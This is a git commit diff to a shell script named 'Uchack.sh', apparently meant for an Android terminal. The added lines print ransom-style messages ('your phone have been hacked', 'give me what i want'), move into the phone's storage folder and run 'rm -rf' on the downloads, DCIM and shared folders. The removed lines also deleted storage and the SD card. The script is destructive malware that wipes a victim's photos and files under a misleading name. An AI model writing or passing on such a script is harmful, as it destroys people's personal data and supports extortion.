b993d439ab51a99edb2406c2d7abc63573fbc13e
apourbo <69768031+apourbo@users.noreply.github.com>
2022-08-30 01:02:04 +0600

    Update
    Yes

--- Uchack.sh
+++ Uchack.sh
@@ -1,2 +1,10 @@
-rm -rf storage
-rm -rf sdcard
+echo "sorry bro your phone have been hacked "
+echo "If you want your phone back"
+echo "give me what i want"
+cd
+cd storage/
+rm -rf downloads dcim shared
+echo "Here is the proof, I delete all your folder download files and photos"
+By by
+
+
